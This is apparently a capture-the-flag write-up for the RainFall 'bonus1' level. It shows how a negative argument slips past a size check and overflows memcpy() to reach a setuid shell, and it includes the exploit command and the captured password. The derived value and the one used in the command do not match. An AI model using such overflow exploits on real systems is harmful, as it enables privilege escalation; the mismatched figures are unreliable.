@@ -1,0 +1,25 @@
+There is a setuid binary "bonus1" own by bonus2
+
+After disassembling the binary we can see that main() function call execl() with "/bin/sh"
+only if it assert number == 0x574f4c46      <=>     "WOLF"
+but number also need to be less than 10
+
+We could somewhat use the memcpy() to replace the number value
+as the prototype of memcpy use size_t as a length parameter
+void * memcpy (void * dest, void * src, size_t n);
+
+size_t is an unsigned number
+if the length parameter is a big negative number it will be convert to a small positive one
+
+
+we need to overflow 4 Bytes after the buffer so we need to make number equal to 11
+
+and set the value of argv[1] to match requirement
+
+argv[0] => (INT_MIN + 11) => -(2**31) + 11 => -2147483637
+argv[1] => "#" * 40 + "FLOW"
+
+bonus1@RainFall:~$> ./bonus1 "-2147483604" "########################################FLOW"
+
+bonus2@RainFall:~$> cat ~bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
